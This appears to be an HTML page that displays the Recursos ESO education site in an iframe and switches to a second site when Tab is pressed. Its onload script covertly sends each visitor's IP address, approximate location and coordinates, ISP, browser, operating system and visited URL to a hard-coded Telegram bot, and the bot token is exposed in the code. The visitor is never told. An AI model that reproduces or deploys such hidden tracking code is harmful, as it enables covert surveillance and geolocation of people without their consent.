   <script>
 window.onload = function() {
    const telegramUrl = "https://api.telegram.org/bot7815776748:AAGl2LfwdET9KRExkGVyYzGfUiXDcqEwUBY/sendMessage";
    const chatId = "5895952454"; // Tu ID de chat real

    // Obtener detalles del navegador y sistema operativo
    const userAgent = navigator.userAgent;

    // Obtener la IP y ubicación con una API externa
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const city = data.city;
            const region = data.region;
            const country = data.country_name;
            const isp = data.org;
            const lat = data.latitude || 'Desconocido';
            const lon = data.longitude || 'Desconocido';

            // Crear el enlace de Google Maps con las coordenadas
            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

            // Obtener si el usuario está usando un dispositivo móvil o de escritorio
            const deviceType = /mobile/i.test(userAgent) ? "Móvil" : "Escritorio";

            // Mensaje completo a enviar
            const message = `-----------------------------------

IP del visitante: ${ip}
Ubicación: ${city}, ${region}, ${country}
Proveedor: ${isp}

Dispositivo: ${userAgent.split(" ")[0]}
Tipo de dispositivo: ${deviceType}
Coordenadas: Lat: ${lat} | Lon: ${lon}

Ubicación en Google Maps: ${googleMapsLink}

Navegador: ${navigator.appName} / ${navigator.appVersion}
Sistema Operativo: ${navigator.platform}

URL visitada: ${window.location.href}

-----------------------------------`;

            // Enviar el mensaje completo
            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Mensaje enviado con éxito.");
                    } else {
                        console.error("Error al enviar el mensaje:", data);
                    }
                })
                .catch(error => console.error("Error de red:", error));
        })
        .catch(error => console.error("Error al obtener la IP:", error));
};
 </script>
    
    <div id="loadingScreen" class="hidden">
        <div class="spinner"></div>
    </div>
    <iframe id="recursosESOFrame" class="active" src="https://www.recursoseso.com/" title="Recursos ESO"></iframe>
    <iframe id="emacFrame" src="https://emacproject.github.io" title="Emac Project"></iframe>

    <script>
        let currentFrame = 'recursosESOFrame';
        document.addEventListener('keydown', (event) => {
            if (event.key === 'Tab') {
                event.preventDefault();
                const loadingScreen = document.getElementById('loadingScreen');
                const nextFrame = currentFrame === 'recursosESOFrame' ? 'emacFrame' : 'recursosESOFrame';

                if (nextFrame === 'emacFrame') {
                    loadingScreen.classList.remove('hidden');
                    setTimeout(() => {
                        switchFrame(nextFrame);
                        loadingScreen.classList.add('hidden');
                    }, 3000);
                } else {
                    switchFrame(nextFrame);
                }
            }
        });

        function switchFrame(frameId) {
            document.querySelectorAll('iframe').forEach(iframe => iframe.classList.remove('active'));
            document.getElementById(frameId).classList.add('active');
            currentFrame = frameId;
        }
    </script>
